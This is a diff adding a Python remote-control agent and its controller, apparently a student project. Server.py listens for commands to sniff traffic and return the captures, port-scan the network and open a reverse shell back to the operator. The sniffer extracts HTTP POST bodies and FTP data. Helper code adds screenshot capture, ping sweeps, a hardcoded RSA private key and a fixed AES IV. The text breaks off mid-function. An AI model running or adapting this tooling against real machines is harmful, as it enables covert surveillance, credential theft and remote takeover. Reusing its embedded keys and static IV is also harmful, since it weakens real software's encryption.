@@ -1,0 +1,1590 @@
+File Name: Client.py 
+##################################################################
+import socket
+import time
+from threading import Thread
+
+
+class Client(Thread):
+    def __init__(self, IP: str, Port: int):
+        self.conn = socket.socket()
+        self.target_IP = IP
+        self.Port = Port
+        print(f"Trying to connect to {self.target_IP} in port {self.Port}")
+        self.counter = 0
+        while True:
+            if self.counter == 10:
+                self.conn.shutdown(socket.SHUT_RDWR)
+                self.conn.close()
+                exit()
+            else:
+                try:
+                    self.conn.connect((IP, Port))
+                    break
+                except Exception:
+                    time.sleep(2)
+                    self.counter += 1
+                    continue
+
+    def activate_sniff(self):
+        try:
+            self.conn.send('7'.encode())  # length of SNF_SRT
+            time.sleep(4)
+            self.conn.send('SNF_SRT'.encode())
+            length = self.conn.recv(1024).decode()
+            while not length:
+                length = self.conn.recv(1024).decode()
+            results = self.conn.recv(int(length)).decode('ISO-8859-1', errors='ignore')
+            path = time.asctime()[4:8] + time.asctime()[8:10] + "-" + time.asctime()[
+                                                                      20:] + "-" + time.asctime()[
+                                                                                   11:19].replace(
+                ':', '_')
+            f = open(path+'.pcap', 'wb')
+            while True:
+                bits = self.conn.recv(1024)
+                if bits.endswith('DONE'.encode('ISO-8859-1', errors='ignore')):
+                    f.write(bits[:-4])
+                    f.close()
+                    print('[+] Transfer completed')
+                    break
+                if 'File not found'.encode('ISO-8859-1', errors='ignore') in bits:
+                    print("[-] File not found")
+                    break
+                f.write(bits)
+            time.sleep(2)
+            self.conn.send('4'.encode())
+            time.sleep(4)
+            self.conn.send('EXIT'.encode())
+            return results
+        except (ConnectionResetError, ConnectionAbortedError):
+            self.conn.shutdown(socket.SHUT_RDWR)
+            self.conn.close()
+            self.__init__(self.target_IP, self.Port)
+            self.activate_sniff()
+
+    def activate_SYN(self) -> str:
+        try:
+            self.conn.send('7'.encode())
+            time.sleep(4)
+            self.conn.send('SYN_SRT'.encode())
+            length = self.conn.recv(1024).decode()
+            results = self.conn.recv(int(length)).decode()
+            print(results)
+            self.conn.send('4'.encode())
+            time.sleep(4)
+            self.conn.send('EXIT'.encode())
+            return results
+        except (ConnectionResetError, ConnectionAbortedError):
+            self.conn.shutdown(socket.SHUT_RDWR)
+            self.conn.close()
+            self.__init__(self.target_IP, self.Port)
+            self.activate_SYN()
+
+    def activate_UDP(self):
+        try:
+            self.conn.send('7'.encode())
+            time.sleep(4)
+            self.conn.send('UDP_SRT'.encode())
+            length = self.conn.recv(1024).decode()
+            results = self.conn.recv(int(length)).decode()
+            self.conn.send('4'.encode())
+            time.sleep(4)
+            self.conn.send('EXIT'.encode())
+            return results
+        except (ConnectionResetError, ConnectionAbortedError):
+            self.conn.shutdown(socket.SHUT_RDWR)
+            self.conn.close()
+            self.__init__(self.target_IP, self.Port)
+            self.activate_UDP()
+
+    def activate_Stealth(self):
+        try:
+            self.conn.send('11'.encode())  # length of STEALTH_SRT
+            time.sleep(4)
+            self.conn.send('STEALTH_SRT'.encode())
+            length = self.conn.recv(1024).decode()
+            results = self.conn.recv(int(length)).decode()
+            self.conn.send('4'.encode())
+            time.sleep(4)
+            self.conn.send('EXIT'.encode())
+            return results
+        except (ConnectionResetError, ConnectionAbortedError):
+            self.conn.shutdown(socket.SHUT_RDWR)
+            self.conn.close()
+            self.__init__(self.target_IP, self.Port)
+            self.activate_Stealth()
+
+    def activate_reverse_shell(self):
+        try:
+            self.conn.send('7'.encode())
+            time.sleep(4)
+            self.conn.send('REV_ACT'.encode())
+        except (ConnectionResetError, ConnectionAbortedError):
+            self.conn.shutdown(socket.SHUT_RDWR)
+            self.conn.close()
+            self.__init__(self.target_IP, self.Port)
+            self.activate_reverse_shell()
+
+    def run(self) -> None:
+        while True:
+            time.sleep(5)
+
+
+
+
+def main():
+    client = Client('10.0.0.19', 16549)
+    # client.activate_sniff()
+    # client.activate_Stealth()
+    # client.activate_SYN()
+    # client.activate_UDP()
+
+
+if __name__ == '__main__':
+    main()
+File Name: helper_methods.py 
+##################################################################
+import random
+import string
+import subprocess
+import threading
+import time
+import netifaces
+from Cryptodome.Cipher import AES
+from Cryptodome.Cipher import PKCS1_OAEP
+from Cryptodome.PublicKey import RSA
+from Cryptodome.Util import Padding
+from PIL import ImageGrab
+import os
+import socket
+from netaddr import IPNetwork
+import re
+
+IV = b"H" * 16
+
+enc_key = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{['
+                                                                                                  ']}+~#-_.:,'
+                                                                                                  ';<>|\\') for i in
+                  range(0, 32))
+
+
+def list_to_path(lis: list):
+    return ''.join(lis[i] + ' ' if len(lis) > 1 else lis[i] for i in range(len(lis)))
+
+
+def screenshot() -> str:
+    snapshot = ImageGrab.grab()
+    save_path = "screenshots/" + time.asctime()[4:8] + time.asctime()[8:10] + "-" + time.asctime()[
+                                                                                    20:] + "-" + time.asctime()[
+                                                                                                 11:19].replace(
+        ':', '_') + ".jpg"  # This line slices from the module time only the date and time,
+    # and replaces every ':' with '-' so the file will be able to be saved.
+    snapshot.save(save_path)
+    return save_path
+
+
+def RSAFunc_server(message):
+    # Server Side Encryption RSA of the key
+    publicKey = """-----BEGIN PUBLIC KEY-----
+MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAo41dU8F/yw5NvgBvfvMB
+cW6kHxWG3lunMp0y/8D5oHOBzuXrB6DR5O0cK768NwQpueDJIzBUmMO7rwF+UHZG
+4h20R8v4WMDItIr9NLrNNMPhXDEIDo9A9NaMsa/PtHztsnlfJbm/sOffwScnKGrH
+5cmfzXu2AQA0vA8DUDdr3aJH5gRrPT6t+MNSBh3OskP5lfFa83kk9wwQp3RmDu+R
+Sc4x0/4TiBXxZ8o9SikgcYmICUvitd1WOu4TDCdDFBM/aEwWQ5YpG0Oc/isiUwyX
+bqJJQ+SScYw2b6jNkxzlw7/B2ZfG1sEubo0BoXHRqMTkzJyi76o8SCG/dWtMHaSg
+JXeSHwPxVcIppZ6D8jQt8r2tUaWydSa/xnVfSTZBHe/9PKEsu292tpwr4DD7E4ty
+33OmYWreNV8TZ9MK1npf2Lkwq/kqZO/wt3MqoUdd19hc83oYYD19B0PxtMkRmHIk
+EZANa986Fws/1Q9i6ZF1KzskZ+Bg9vwCLzUyUWtKd8a1Z97qR1ETOBv9PhuMwIlS
+C4KBCuFNnvwdiXthuCalodwKu1ZjOMsX5lFzNPfUVwGg7y4GKI/VKaugdpCAdkiV
+kYKEfXrZ30eC2eXR0HuSNT/wCTbzHAYqlgHO8lLoZNubSTyBMoDIqEWRuApjjTFG
+IYlvCv4afkIxMzzSAgBPHLkCAwEAAQ==
+-----END PUBLIC KEY-----"""
+    publicKeyAfterImport = RSA.importKey(publicKey)
+    encryptoMe = PKCS1_OAEP.new(publicKeyAfterImport)
+    encryptedData = encryptoMe.encrypt(message)
+    return encryptedData
+
+
+def RSAFunc_client(data):
+    privatekey = """-----BEGIN RSA PRIVATE KEY-----
+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
+-----END RSA PRIVATE KEY-----"""
+    privateKeyAfterImport = RSA.importKey(privatekey)
+    decryptoMe = PKCS1_OAEP.new(privateKeyAfterImport)
+    return decryptoMe.decrypt(data).decode('ISO-8859-1', errors='ignore')
+
+
+def encrypt_server(message):
+    encryptor = AES.new(enc_key.encode('ISO-8859-1', errors='ignore'), AES.MODE_CBC, IV)
+    padded_message = Padding.pad(message, 16)
+    encrypted_message = encryptor.encrypt(padded_message)
+    return encrypted_message
+
+
+def decrypt_server(data):
+    decryptor = AES.new(enc_key.encode('ISO-8859-1', errors='ignore'), AES.MODE_CBC, IV)
+    decrypted_padded_message = decryptor.decrypt(data)
+    decrypted_message = Padding.unpad(decrypted_padded_message,
+                                      16)
+    return decrypted_message
+
+
+def encrypt_client(message, AES_KEY):
+    encryptor = AES.new(AES_KEY, AES.MODE_CBC, IV)
+    padded_message = Padding.pad(message, 16)
+    encrypted_message = encryptor.encrypt(padded_message)
+    return encrypted_message
+
+
+def decrypt_client(data, AES_KEY):
+    decryptor = AES.new(AES_KEY, AES.MODE_CBC, IV)
+    decrypted_padded_message = decryptor.decrypt(data)
+    decrypted_message = Padding.unpad(decrypted_padded_message, 16)
+    return decrypted_message
+
+
+def check_hosts(subnet_mask: str):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip_address = s.getsockname()[0]
+    network = IPNetwork('/'.join([ip_address, subnet_mask]))
+    generator = network.iter_hosts()
+    st = ''
+    for i in list(generator):
+        st += str(i) + '\n'
+    return st
+
+
+def scanner(ip_addresses: list, lock: threading.Lock, clients: list):
+    for ip_address in ip_addresses:
+        result = os.popen('ping {0} -n 2'.format(ip_address)).read()
+        if "TTL" in result:
+            with lock:
+                clients.append(ip_address)
+            print(ip_address)
+
+
+def get_ip_address():
+    print("here")
+    s = socket.socket()
+    s.connect(("1.1.1.1", 80))
+    ip = s.getsockname()[0]
+    s.close()
+    return ip
+
+
+def get_processor_num():
+    return os.cpu_count()
+
+
+def get_subnet_mask():
+    res = subprocess.Popen(r"ipconfig", stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding='ISO-8859-1', errors='ignore').stdout.read()
+    sm = re.findall(f"{get_ip_address()}\n.*Subnet Mask .* (255.*)", res)[0]
+    print(sm)
+
+
+def main():
+    get_subnet_mask()
+
+
+if __name__ == '__main__':
+    main()
+File Name: Packages_Installer.py 
+##################################################################
+import subprocess
+import sys
+
+import pkg_resources
+from pkg_resources import DistributionNotFound, VersionConflict
+
+
+def should_install_requirement(requirement):
+    should_install = False
+    try:
+        pkg_resources.require(requirement)
+    except (DistributionNotFound, VersionConflict):
+        should_install = True
+    return should_install
+
+
+def install_packages(requirement_list):
+    try:
+        requirements = [
+            requirement
+            for requirement in requirement_list
+            if should_install_requirement(requirement)
+        ]
+        if len(requirements) > 0:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", *requirements])
+        else:
+            print("Requirements already satisfied.")
+
+    except Exception as e:
+        print(e)
+
+
+def main():
+    requirements = ['pynput', 'Flask', 'Flask-SQLAlchemy', 'requests', 'scapy', 'pycryptodomex', 'Pillow', 'netaddr']
+    install_packages(requirements)
+
+
+main()
+File Name: PACKET_SNIFFER.py 
+##################################################################
+from scapy.all import *
+from scapy.layers.dhcp import *
+from scapy.layers.dns import DNSQR, DNS
+from scapy.layers.http import HTTPRequest, HTTPResponse
+from scapy.layers.inet import ICMP, TCP, UDP
+from scapy.layers.smb import *
+import time
+
+
+def filter_dns(packet: scapy.packet) -> bool:
+    """The function receives a packet and returns whether or not it is a DNS packet."""
+    return DNS in packet and packet[DNS].opcode == 0 and packet[DNSQR].qtype == 1
+
+
+def print_query_name(dns_packet: scapy.packet):
+    """The function receives a DNS packet and prints the query name requested in it."""
+    return f"DNS request for the domain: {dns_packet[DNSQR].qname.decode()} from the IP address: {dns_packet[IP].src}"
+
+
+def filterstringDNS(packets: list):
+    st = ""
+    for packet in packets:
+        st += print_query_name(packet) + "\n"
+    return st
+
+
+def sniff_http_packets():
+    sniff(filter="port 80", prn=filter_HTTP, store=False)
+
+
+def filter_HTTP(packets: list):
+    """The function receives an HTTP packet and prints out the HTTP request."""
+    st = ""
+    for packet in packets:
+        if packet.haslayer(HTTPRequest):
+            # if this packet is an HTTP Request
+            # get the requested URL
+            url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
+            # get the requester's IP Address
+            ip = packet[IP].src
+            # get the request method
+            method = packet[HTTPRequest].Method.decode()
+            st += f"\n[+] {ip} Requested {url} with {method}"
+            if packet.haslayer(Raw) and method == "POST":
+                # if show_raw flag is enabled, has raw data, and the requested method is "POST"
+                # then show raw
+                st += f'\n[*] Some useful Raw data: {packet[Raw].load}'
+    return st
+
+
+def filter_ICMP(packets):
+    """The function receives list of packets and prints the IP of them."""
+    st = ""
+    for packet in packets:
+        if str(packet.getlayer(ICMP).type) == "8":
+            st += f"Ping Arrived from: {packet[IP].src}\n"
+    return st
+
+
+def filter_DHCP(DHCP_packets):
+    """The function receives list of packets and prints the IP of them."""
+    st = ""
+    for packet in DHCP_packets:
+        st += f"DHCP request Arrived from: {packet[IP].src}\n"
+    return st
+
+
+def filter_SSH(SSH_packets):
+    """The function receives list of packets and prints the IP of them."""
+    st = ""
+    for packet in SSH_packets:
+        st += f"SSH request Arrived from: {packet[IP].src}\n"
+    return st
+
+
+def filter_SMB(SMB_packets):
+    """The function receives list of packets and prints the IP of the packets and the raw data of them."""
+    st = ""
+    for packet in SMB_packets:
+        st += f"SMB request from IP: {packet.getlayer(IP).src}"
+        if packet.haslayer(Raw):
+            st += SMBSession_Setup_AndX_Request(packet.getlayer(Raw).load).NativeOS + "\n"
+    return st
+
+
+def filter_FTP(FTP_packets):
+    """The function receives list of packets and prints the IP of the packets and the raw data of them."""
+    st = ""
+    for packet in FTP_packets:
+        st += f"Source IP: {packet[IP].src}" + f"Data: {packet[Raw].load}\n"
+    return st
+
+
+def gen_sniff(num=1000):
+    """The function sniffs 1000 packets by default, sorts them by the protocols HTTP, ICMP, SMB, FTP, SSH, DNS, DHCP and prints
+    the most important data in them. """
+    sorted_packets = [[] for _ in range(7)]
+    print('Packet Sniffer has been activated!')
+    packets = sniff(count=num)
+    path = time.asctime()[4:8] + time.asctime()[8:10] + "-" + time.asctime()[
+                                                              20:] + "-" + time.asctime()[
+                                                                           11:19].replace(
+        ':', '_')
+    wrpcap(path, packets)
+    print('Packet Sniffer has been Terminated!')
+    for packet in packets:
+        if packet.haslayer(HTTPRequest) or packet.haslayer(HTTPResponse):
+            sorted_packets[0].append(packet)
+        elif packet.haslayer(ICMP):
+            sorted_packets[1].append(packet)
+        elif packet.haslayer(SMBSession_Setup_AndX_Request):
+            sorted_packets[2].append(packet)
+        elif packet.haslayer(TCP) and packet[TCP].dport == 21:
+            sorted_packets[3].append(packet)
+        elif packet.haslayer(TCP) and packet[TCP].dport == 22:
+            sorted_packets[4].append(packet)
+        elif packet.haslayer(UDP) and packet.haslayer(DNS) and packet.haslayer(DNSQR):
+            sorted_packets[5].append(packet)
+        elif packet.haslayer(UDP) and packet[UDP].dport == 67 or packet.haslayer(UDP) and packet[UDP].dport == 68:
+            sorted_packets[6].append(packet)
+    return sorted_packets, path
+
+
+def main():
+    gen_sniff()
+
+
+if __name__ == "__main__":
+    main()
+File Name: PortScanner.py 
+##################################################################
+from scapy.all import *
+from scapy.layers.inet import ICMP, IP, UDP, TCP
+from helper_methods import get_processor_num
+
+
+def divide_ports(start_port=1, end_port=65536) -> list:
+    """Receives start port and end port and return a list of tuples where each element is a tuple
+     specifying a range of ports to scan."""
+    length = (end_port - start_port) // (get_processor_num() * 2)
+    ind = 0
+    l = []
+    for port in range(1, get_processor_num() * 2 + 1, length * ind + 1):
+        ending_port = length * (ind + 1)
+        if ind == get_processor_num() * 2 - 1:
+            ending_port = end_port
+        l.append((start_port, ending_port))
+        start_port += length
+        ind += 1
+    return l
+
+
+def check_ports(start_port, end_port):
+    if start_port > end_port:
+        start_port, end_port = end_port, start_port
+    elif start_port == end_port:
+        end_port += 1
+    if end_port > 65535:
+        end_port = 65535
+    return start_port, end_port
+
+
+class PortScanner:
+    def __init__(self, ip_address: str):
+        self.target_ip_address = ip_address
+        self.open_ports = []
+
+    def UDP_Scan_Wrap(self, start_port=1, end_port=65535):
+        start_port, end_port = check_ports(start_port, end_port)
+        self.open_ports = []
+        self.counter = 0
+        li = divide_ports(start_port, end_port)
+        threads = []
+        for i in range(len(li)):
+            t = Thread(target=self.UDP_Scan, args=(li[i],))
+            threads.append(t)
+            t.start()
+        for t in threads:
+            t.join()
+        return sorted(self.open_ports)
+
+    def UDP_Scan(self, ports: Tuple):
+        for port in range(ports[0], ports[1] + 1):
+            response = sr1(IP(dst=self.target_ip_address) / UDP(dport=port), timeout=10, verbose=0)
+            if response and response.haslayer(UDP):
+                self.open_ports.append(port)
+            self.counter += 1
+            if self.counter % 655 == 0:
+                print(f"{self.counter / 65536:.2%} done")
+
+    def SYN_Scan_Wrap(self, start_port=1, end_port=65535):
+        start_port, end_port = check_ports(start_port, end_port)
+        self.open_ports = []
+        self.counter = 0
+        threads = []
+        li = divide_ports(start_port, end_port)  # For example [(1, 2000), (2001, 4000), (4001, 6000)]
+        for i in range(len(li)):
+            t = Thread(target=self.SYN_Scan, args=(li[i],))
+            threads.append(t)
+            t.start()
+        for t in threads:
+            t.join()
+        return sorted(self.open_ports)
+
+    def SYN_Scan(self, ports: Tuple):
+        for port in range(ports[0], ports[1] + 1):
+            try:
+                packet = IP(dst=self.target_ip_address) / TCP(dport=port, flags='S')
+                response = sr1(packet, timeout=0.5, verbose=0)
+                if response and response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
+                    self.open_ports.append(port)
+                self.counter += 1
+                if self.counter % 655 == 0:
+                    print(f"{self.counter / 65536:.2%} done")
+            except Exception:
+                continue
+
+    def Stealth_Scan_Wrap(self, start_port=1, end_port=65535):
+        self.open_ports = []
+        start_port, end_port = check_ports(start_port, end_port)
+        self.counter = 0
+        li = divide_ports(start_port, end_port)
+        threads = []
+        for i in range(len(li)):
+            t = Thread(target=self.Stealth_Scan, args=(li[i],))
+            threads.append(t)
+            t.start()
+        for t in threads:
+            t.join()
+        return sorted(self.open_ports)
+
+    def Stealth_Scan(self, ports: Tuple):
+        for port in range(ports[0], ports[1] + 1):
+            response = sr1(IP(dst=self.target_ip_address) / TCP(sport=port, dport=port, flags='S'), timeout=5,
+                           verbose=0)
+            if response and response.haslayer(TCP):
+                if response.getlayer(TCP).flags == 0x12:
+                    sr(IP(dst=self.target_ip_address) / TCP(sport=port, dport=port, flags='R'), timeout=5, verbose=0)
+                    self.open_ports.append(port)
+            self.counter += 1
+            if self.counter % 655 == 0:
+                print(f"{self.counter / 65536:.2%} done")
+
+
+def main():
+    port_scanner = PortScanner('10.0.0.18')
+    start_time = time.perf_counter()
+    print(port_scanner.Stealth_Scan_Wrap())
+    print("results:", port_scanner.SYN_Scan_Wrap())
+    end_time = time.perf_counter()
+    print(f"Time took to scan: {end_time - start_time}")
+
+
+if __name__ == '__main__':
+    main()
+File Name: pure_port_scan.py 
+##################################################################
+from scapy.all import *
+from scapy.layers.inet import TCP, ICMP, IP, UDP
+
+
+def check_ports(start_port, end_port):
+    if start_port > end_port:
+        start_port, end_port = end_port, start_port
+    elif start_port == end_port:
+        end_port += 1
+    return start_port, end_port
+
+
+def Connect_Scan(IP_address, start_port=1, end_port=65536):
+    """TCP S flag stands for SYN request in the TCP 3 way handshake.
+    TCP A flag stands for ACK response in the TCP 3 way handshake
+    The code for SYN - ACK flag is 0x12."""
+    open_ports = []
+    start_port, end_port = check_ports(start_port, end_port)
+    for port in range(start_port, end_port):
+        packet = IP(dst=IP_address) / TCP(dport=port, flags='S')
+        response = sr1(packet, timeout=0.5, verbose=0)
+        if response and response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
+            print(f"Port {port} is open!")
+            open_ports.append(port)
+            ACK = IP(dst=IP_address) / TCP(dport=response.sport, flags='AR')
+            sr(ACK, timeout=0.2, verbose=0)
+    print("Scan is complete!")
+    return open_ports
+
+
+def Stealth_Scan(IP_address, start_port=1, end_port=65536):
+    open_ports = []
+    start_port, end_port = check_ports(start_port, end_port)
+    for port in range(start_port, end_port):
+        response = sr1(IP(dst=IP_address) / TCP(sport=port, dport=port, flags='S'), timeout=5, verbose=0)
+        if not response:
+            print(f"Port {port} is Filtered!")
+        elif response.haslayer(TCP):
+            if response.getlayer(TCP).flags == 0x12:
+                sr(IP(dst=IP_address) / TCP(sport=port, dport=port, flags='R'), timeout=5, verbose=0)
+                open_ports.append(port)
+                print(f"Port {port} is Open!")
+            elif response.getlayer(TCP).flags == 0x14:
+                print(f"Port {port} is Closed!")
+            elif response.haslayer(ICMP):
+                if int(response.getlayer(ICMP).type) == 3 and int(response.getlayer(ICMP).code) in [1,
+                                                                                                    2,
+                                                                                                    3,
+                                                                                                    9,
+                                                                                                    10,
+                                                                                                    13]:
+                    print(f"Port {port} is Filtered!")
+    print("Scan is complete!")
+    return open_ports
+
+
+def UDP_Scan(dst_ip, start_port=1, end_port=65535):
+    start_port, end_port = check_ports(start_port, end_port)
+    open_ports = []
+    for port in range(start_port, end_port):
+        response = sr1(IP(dst=dst_ip) / UDP(dport=port), timeout=10, verbose=0)
+        if not response:
+            print(f"Port {port} is Filtered or Open!")
+        elif response.haslayer(UDP):
+            open_ports.append(port)
+            print(f"Port {port} is Open!")
+        elif response.haslayer(ICMP) and int(response.getlayer(ICMP).type) == 3 and int(
+                response.getlayer(ICMP).code) in [1, 2, 9, 10, 13]:
+            print(f"Port {port} is Filtered!")
+        else:
+            print(f"Port {port} is Closed!")
+    return open_ports
+
+
+def main():
+    # SYN_Scan('10.0.0.18')
+    Stealth_Scan('10.0.0.20', 20, 90)
+    SYN_Scan('10.0.0.20', 1, 100)
+
+
+if __name__ == "__main__":
+    main()
+File Name: Server.py 
+##################################################################
+import socket
+import time
+from threading import Thread
+
+import PACKET_SNIFFER as snf
+from PortScanner import PortScanner
+from Webshell_Client import Client
+from helper_methods import *
+import Packages_Installer
+
+
+class Server(Thread):
+    def __init__(self):
+        self.conn = socket.socket()
+        self.conn.bind((get_ip_address(), 16549))
+        self.conn.listen(100)
+        print('[+] Listening for income TCP connection on port 16549')
+        self.conn, self.addr = self.conn.accept()
+        print('[+]We got a connection from', self.addr)
+        self.run()
+
+    def run(self) -> None:
+        while True:
+            length = self.conn.recv(1024).decode()
+            while not length:
+                length = self.conn.recv(1024).decode()
+            msg = self.conn.recv(int(length)).decode()
+            print(msg)
+            if msg == 'SNF_SRT':
+                st = ''
+                print('Sniffing Started')
+                sorted_packets, path = snf.gen_sniff()
+                st += snf.filter_HTTP(sorted_packets[0]) + snf.filter_ICMP(sorted_packets[1]) + snf.filter_SMB(
+                    sorted_packets[2])
+                st += snf.filter_FTP(sorted_packets[3]) + snf.filter_SSH(sorted_packets[4]) + snf.filterstringDNS(
+                    sorted_packets[5]) + snf.filter_DHCP(sorted_packets[6])
+                self.conn.send(str(len(st)).encode())
+                self.conn.send(st.encode('ISO-8859-1', errors='ignore'))
+                time.sleep(3)
+                self.transfer(path)
+                continue
+            elif msg == 'SYN_SRT':
+                open_ports = PortScanner(get_ip_address()).SYN_Scan_Wrap()
+                st = ''
+                for open_port in open_ports:
+                    st += f"Port {open_port} is open!" + '\n'
+                self.conn.send(str(len(st)).encode('ISO-8859-1', errors='ignore'))
+                self.conn.send(st.encode('ISO-8859-1', errors='ignore'))
+                continue
+            elif msg == 'STEALTH_SRT':
+                open_ports = PortScanner(get_ip_address()).Stealth_Scan_Wrap()
+                st = ''
+                for open_port in open_ports:
+                    st += f"Port {open_port} is open!" + '\n'
+                self.conn.send(str(len(st)).encode('ISO-8859-1', errors='ignore'))
+                self.conn.send(st.encode('ISO-8859-1', errors='ignore'))
+                continue
+            elif msg == 'UDP_SRT':
+                open_ports = PortScanner(get_ip_address()).UDP_Scan_Wrap()
+                st = ''
+                for open_port in open_ports:
+                    st += f"Port {open_port} is open!" + '\n'
+                self.conn.send(str(len(st)).encode('ISO-8859-1', errors='ignore'))
+                self.conn.send(st.encode('ISO-8859-1', errors='ignore'))
+                continue
+            elif msg == 'REV_ACT':
+                Client(self.addr[0], 9999).run()
+            elif msg == 'EXIT':
+                self.conn.shutdown(socket.SHUT_RDWR)
+                self.conn.close()
+                self.__init__()
+
+    def transfer(self, path):
+        import os
+        if os.path.exists(path):
+            f = open(path, 'rb')
+            packet = f.read(1024)
+            while len(packet) > 0:
+                self.conn.send(packet)
+                packet = f.read(1024)
